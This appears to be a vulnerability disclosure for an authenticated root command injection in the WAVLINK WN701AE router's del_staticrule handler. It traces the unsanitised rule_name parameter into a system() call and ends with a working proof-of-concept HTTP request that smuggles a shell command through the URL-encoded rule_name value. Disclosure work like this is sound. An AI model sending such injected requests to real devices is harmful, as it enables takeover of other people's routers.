# WAVLINK WN701AE Router

-  Vendor: WAVLINK
-  Product: WL-WN701AE
-  Firmware Version: M01AE_V260105
-  Vulnerability Type:Authenticated Command Injection

# Description

A command injection vulnerability exists in the ioos web backend of the WAVLINK WN701AE firmware (version WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin). 
In the del_staticrule function, the `rule_name` parameter is not properly sanitized before being concatenated into the system() call: 
`static_route_setting.sh del "%s"`. 
An authenticated attacker can exploit this vulnerability by injecting arbitrary system commands, leading to remote code execution with root privileges.

## Impact
An attacker exploiting this command injection vulnerability via the `del_staticrule` function can execute arbitrary commands with root privileges, achieving full compromise of the router. 
The potential impacts include but are not limited to:
- **Traffic Interception & Manipulation**: Stealing or tampering with network traffic passing through the device.
- **Persistent Backdoor**: Modifying firmware configurations to implant persistent backdoors for long-term access.
- **Lateral Movement**: Using the compromised router as a foothold to launch further attacks against internal network hosts.
- **Botnet Recruitment**: Enrolling the device into a large-scale botnet to participate in DDoS attacks or other malicious activities against external targets.

## Vulnerability Details

The vulnerability resides in the `del_staticrule` function (sub_40D868) of the ioos web backend. 

After the login check is performed, the user-controllable parameter `rule_name` is retrieved via `con_value_get(a2, "rule_name")` and copied into the stack buffer `v7` using `strcpy(v7, v4)` without any input validation or sanitization.

The function then enters a `for` loop where `strtok_r(v7, ";", v9)` splits the input string using the semicolon (`;`) as a delimiter. Each token is sequentially assigned to pointer `i`. 

For each token, the code constructs a command string using `snprintf(v8, 256, "static_route_setting.sh del \"%s\"", i)`, which embeds the user-controlled token directly into the command template. 

Finally, `system(v8)` is invoked to execute the constructed command. 

Because the `rule_name` parameter is unsafely concatenated into the system command without any filtering or escaping of shell metacharacters (such as `;`, `|`, `&`, `` ` ``, `$()`, etc.), an attacker can inject arbitrary system commands. This allows the execution of malicious commands with root privileges, leading to full device compromise.

<img width="1442" height="427" alt="图片" src="https://github.com/user-attachments/assets/a1380651-60df-473a-9121-39400361393d" />


<img width="1692" height="1148" alt="图片" src="https://github.com/user-attachments/assets/e72e86da-4b91-46d7-8c47-37d64c5c6ae5" />


Let's simulate it first.

<img width="1157" height="674" alt="图片" src="https://github.com/user-attachments/assets/2aea3811-5030-4a16-9e1d-9be4fb126a54" />


**exp**

The session token (cookie) needs to be obtained through login first.

```http
GET /protocol.csp?fname=net&opt=del_staticrule&function=set&rule_name=aa%22%20%7C%20echo%20get_shell>%2Ftest%20%23&token=EC2882AD8F1AE344AFA5096E5B68E912 HTTP/1.1

Host: 192.168.10.3

If-Modified-Since: Fri, 07 Aug 2026 07:36:19 GMT

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

If-None-Match: "3407588632"

Accept: */*

Referer: http://192.168.10.3/html/index.html?v=1786094291914

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```

Before Exploitation

<img width="1309" height="380" alt="图片" src="https://github.com/user-attachments/assets/a6440fdf-97f6-412e-ba9d-a373ce5754e2" />

After Exploitation

<img width="1402" height="383" alt="图片" src="https://github.com/user-attachments/assets/1fe5e825-353d-4206-a375-45cf1127f982" />


<img width="1265" height="382" alt="图片" src="https://github.com/user-attachments/assets/5763791f-6a1d-49af-8cdf-39038cb6f3a5" />


















